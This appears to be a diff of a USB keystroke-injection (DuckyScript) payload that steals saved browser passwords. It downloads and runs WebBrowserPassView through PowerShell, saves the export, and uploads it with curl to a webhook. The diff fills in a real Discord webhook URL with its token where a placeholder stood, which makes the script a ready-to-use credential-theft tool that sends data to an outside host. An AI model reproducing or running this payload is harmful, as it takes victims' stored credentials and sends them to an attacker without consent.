@@ -9,10 +9,10 @@ REM Category:	Passwords                                                         
 REM ################################################################################################################
 DELAY 900
 GUI r
-DELAY 1000
+DELAY 900
 STRING powershell
 ENTER
-DELAY 1000
+DELAY 900
 STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip
 ENTER
 DELAY 4000
@@ -20,7 +20,7 @@ STRING wbpv28821@
 ENTER
 STRING .\WebBrowserPassView.exe; exit
 ENTER
-DELAY 2500
+DELAY 2000
 CTRL A
 CTRL S
 DELAY 1000
@@ -37,6 +37,5 @@ STRING powershell
 ENTER
 DELAY 900
 REM Replace <WEBHOOK URL> with your URL
-STRING $file = 'C:\temp\export.htm';$url = "<WEBHOOK URL>";Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$file" $url; exit
+STRING $file = 'C:\temp\export.htm';$url = "https://discord.com/api/webhooks/1059819241957773412/68iCYTlEdChwAJ2fjqXgbwQQD6UDnRooW5iZBRPH9cnw3K76yDfhcq2jSVBxbEwu-q9E";Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$file" $url; exit
 ENTER
-
